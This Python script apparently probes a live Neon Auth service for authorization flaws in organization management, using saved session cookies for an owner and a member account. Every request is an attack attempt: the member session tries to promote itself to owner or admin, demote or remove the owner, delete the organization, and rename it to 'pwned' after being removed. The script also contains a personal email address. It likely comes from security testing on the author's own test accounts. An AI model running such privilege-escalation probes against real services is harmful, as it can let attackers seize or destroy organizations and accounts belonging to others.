# -*- coding: utf-8 -*-
"""Neon Auth org 越权矩阵 v2:正确 member id"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
s = json.load(open('_na_sess.json'))
ck1, ck2 = s['ck1'], s['ck2']
ORG = 'cb082192-236a-482e-82d5-43a2c778facb'
MID_NA1 = 'c223da2d-ad4f-475a-94b4-c00d01df963f'   # owner
MID_NA2 = 'bafa4203-644d-4206-bce0-e74e3e8b583a'   # member

def req(method, path, body=None, cookie=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=25)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json',
             'Origin': ORIGIN}
        if cookie:
            h['Cookie'] = cookie
        conn.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse(); raw = r.read()
        st = r.status; conn.close()
        return st, raw[:500]
    except Exception as e:
        return 0, str(e).encode()[:120]

def show(tag, st, raw, n=350):
    print('[%s] -> %d | %s' % (tag, st, raw.decode(errors='replace')[:n]), flush=True)
    time.sleep(0.7)

# na2(member)攻击面
show('na2 self-promote owner', *req('POST', '/neondb/auth/organization/update-member-role',
    {'organizationId': ORG, 'memberId': MID_NA2, 'role': 'owner'}, cookie=ck2))
show('na2 self-promote admin', *req('POST', '/neondb/auth/organization/update-member-role',
    {'organizationId': ORG, 'memberId': MID_NA2, 'role': 'admin'}, cookie=ck2))
show('na2 demote owner', *req('POST', '/neondb/auth/organization/update-member-role',
    {'organizationId': ORG, 'memberId': MID_NA1, 'role': 'member'}, cookie=ck2))
show('na2 remove owner(mid)', *req('POST', '/neondb/auth/organization/remove-member',
    {'organizationId': ORG, 'memberIdOrEmail': MID_NA1}, cookie=ck2))
show('na2 remove owner(uid)', *req('POST', '/neondb/auth/organization/remove-member',
    {'organizationId': ORG, 'memberIdOrEmail': s['uid1']}, cookie=ck2))
show('na2 remove owner(email)', *req('POST', '/neondb/auth/organization/remove-member',
    {'organizationId': ORG, 'memberIdOrEmail': 'libobo1229+na1@gmail.com'}, cookie=ck2))
show('na2 delete org', *req('POST', '/neondb/auth/organization/delete',
    {'organizationId': ORG}, cookie=ck2))
show('na2 leave org', *req('POST', '/neondb/auth/organization/leave',
    {'organizationId': ORG}, cookie=ck2))

# na1(owner)正常对照:改 na2 role + 移除
show('na1 demote na2', *req('POST', '/neondb/auth/organization/update-member-role',
    {'organizationId': ORG, 'memberId': MID_NA2, 'role': 'member'}, cookie=ck1))
show('na1 remove na2', *req('POST', '/neondb/auth/organization/remove-member',
    {'organizationId': ORG, 'memberIdOrEmail': MID_NA2}, cookie=ck1))
show('na2 list after removed', *req('GET', '/neondb/auth/organization/list', cookie=ck2))

# na2 再接受同邀请(幂等?) 与 已移除后旧 cookie 还能访问 org?
show('na2 update org after removed', *req('POST', '/neondb/auth/organization/update',
    {'organizationId': ORG, 'data': {'name': 'pwned'}}, cookie=ck2))

print('DONE', flush=True)
